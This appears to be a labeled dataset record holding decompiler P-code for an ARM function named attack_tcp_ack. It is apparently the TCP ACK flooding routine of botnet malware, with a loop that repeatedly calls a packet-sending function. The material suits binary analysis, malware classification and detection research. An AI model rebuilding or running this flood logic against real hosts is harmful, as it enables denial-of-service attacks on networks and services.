Label: 884562996
Function: attack_tcp_ack
Architecture: arm
Source File: Unknown
Entry Point: 000175dc

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x100002c5, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x17e78, 4) INDIRECT (ram, 0x17e78, 4) , (const, 0x3d, 4)
(ram, 0x17e80, 4) INDIRECT (ram, 0x17e80, 4) , (const, 0x5a7, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x10, 4)
(unique, 0x44100, 2) LOAD (const, 0x1a1, 4) , (unique, 0x9180, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x2, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (unique, 0x44100, 2)
(ram, 0x17e78, 4) INDIRECT (ram, 0x17e78, 4) , (const, 0x5d6, 4)
(ram, 0x17e7c, 4) INDIRECT (ram, 0x17e7c, 4) , (const, 0x5d6, 4)
(ram, 0x17e80, 4) INDIRECT (ram, 0x17e80, 4) , (const, 0x5d6, 4)
(unique, 0x10000298, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffffa0, 4) , (const, 0x18, 4)
(unique, 0x1000029c, 4) PTRSUB (unique, 0x10000298, 4) , (const, 0x0, 4)
(unique, 0x9180, 4) PTRSUB (unique, 0x1000029c, 4) , (const, 0x2, 4)
(register, 0x28, 4) INT_ADD (stack, 0xffffffffffffffcc, 4) , (const, 0x28, 4)
(register, 0x2c, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffffa0, 4) , (const, 0x18, 4)
 ---  CALL (ram, 0x2ba8c, 8) , (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffbc, 4) , (register, 0x28, 4) , (const, 0x4000, 4) , (unique, 0x10000315, 4) , (const, 0x10, 4)
(ram, 0x17e78, 4) INDIRECT (ram, 0x17e78, 4) , (const, 0x62e, 4)
(ram, 0x17e7c, 4) INDIRECT (ram, 0x17e7c, 4) , (const, 0x62e, 4)
(ram, 0x17e80, 4) INDIRECT (ram, 0x17e80, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffcb, 1) INDIRECT (stack, 0xffffffffffffffcb, 1) , (const, 0x62e, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffd2, 1) INDIRECT (stack, 0xffffffffffffffd2, 1) , (const, 0x62e, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x62e, 4)
(stack, 0xffffffffffffffd4, 1) INDIRECT (stack, 0xffffffffffffffd4, 1) , (const, 0x62e, 4)
(stack, 0xffffffffffffffd5, 1) INDIRECT (stack, 0xffffffffffffffd5, 1) , (const, 0x62e, 4)
(stack, 0xffffffffffffffd6, 1) INDIRECT (stack, 0xffffffffffffffd6, 1) , (const, 0x62e, 4)
(stack, 0xffffffffffffffd7, 1) INDIRECT (stack, 0xffffffffffffffd7, 1) , (const, 0x62e, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x62e, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x62e, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x62e, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x62e, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x62e, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x62e, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x62e, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x62e, 4)
(unique, 0x10000315, 4) CAST (register, 0x2c, 4)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffffa0, 4) , (const, 0x1, 4)
(register, 0x28, 4) INT_ZEXT (register, 0x20, 1)
(ram, 0x17e78, 4) MULTIEQUAL (ram, 0x17e78, 4) , (ram, 0x17e78, 4)
(ram, 0x17e7c, 4) MULTIEQUAL (ram, 0x17e7c, 4) , (ram, 0x17e7c, 4)
(ram, 0x17e80, 4) MULTIEQUAL (ram, 0x17e80, 4) , (ram, 0x17e80, 4)
(stack, 0xffffffffffffffa0, 4) MULTIEQUAL (stack, 0xffffffffffffffa0, 4) , (register, 0x2c, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (stack, 0xffffffffffffffa4, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffc4, 4) MULTIEQUAL (stack, 0xffffffffffffffc4, 4) , (stack, 0xffffffffffffffc4, 4)
(stack, 0xffffffffffffffcb, 1) MULTIEQUAL (stack, 0xffffffffffffffcb, 1) , (stack, 0xffffffffffffffcb, 1)
(stack, 0xffffffffffffffcc, 4) MULTIEQUAL (stack, 0xffffffffffffffcc, 4) , (stack, 0xffffffffffffffcc, 4)
(stack, 0xffffffffffffffd2, 1) MULTIEQUAL (stack, 0xffffffffffffffd2, 1) , (stack, 0xffffffffffffffd2, 1)
(stack, 0xffffffffffffffd3, 1) MULTIEQUAL (stack, 0xffffffffffffffd3, 1) , (stack, 0xffffffffffffffd3, 1)
(stack, 0xffffffffffffffd4, 1) MULTIEQUAL (stack, 0xffffffffffffffd4, 1) , (stack, 0xffffffffffffffd4, 1)
(stack, 0xffffffffffffffd5, 1) MULTIEQUAL (stack, 0xffffffffffffffd5, 1) , (stack, 0xffffffffffffffd5, 1)
(stack, 0xffffffffffffffd6, 1) MULTIEQUAL (stack, 0xffffffffffffffd6, 1) , (stack, 0xffffffffffffffd6, 1)
(stack, 0xffffffffffffffd7, 1) MULTIEQUAL (stack, 0xffffffffffffffd7, 1) , (stack, 0xffffffffffffffd7, 1)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe2, 2) MULTIEQUAL (stack, 0xffffffffffffffe2, 2) , (stack, 0xffffffffffffffe2, 2)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe6, 1) MULTIEQUAL (stack, 0xffffffffffffffe6, 1) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 2) MULTIEQUAL (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffe8, 2)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
(unique, 0x2480, 1) INT_SLESS (stack, 0xffffffffffffffa0, 4) , (unique, 0x100002f5, 4)
 ---  CBRANCH (ram, 0x17b7c, 1) , (unique, 0x2480, 1)
(unique, 0x100002f5, 4) CAST (register, 0x28, 4)
(ram, 0x17e78, 4) MULTIEQUAL (ram, 0x17e78, 4) , (ram, 0x17e78, 4)
(ram, 0x17e7c, 4) MULTIEQUAL (ram, 0x17e7c, 4) , (ram, 0x17e7c, 4)
(ram, 0x17e80, 4) MULTIEQUAL (ram, 0x17e80, 4) , (ram, 0x17e80, 4)
 ---  RETURN (const, 0x0, 4)
(ram, 0x17e78, 4) COPY (ram, 0x17e78, 4)
(ram, 0x17e7c, 4) COPY (ram, 0x17e7c, 4)
(ram, 0x17e80, 4) COPY (ram, 0x17e80, 4)
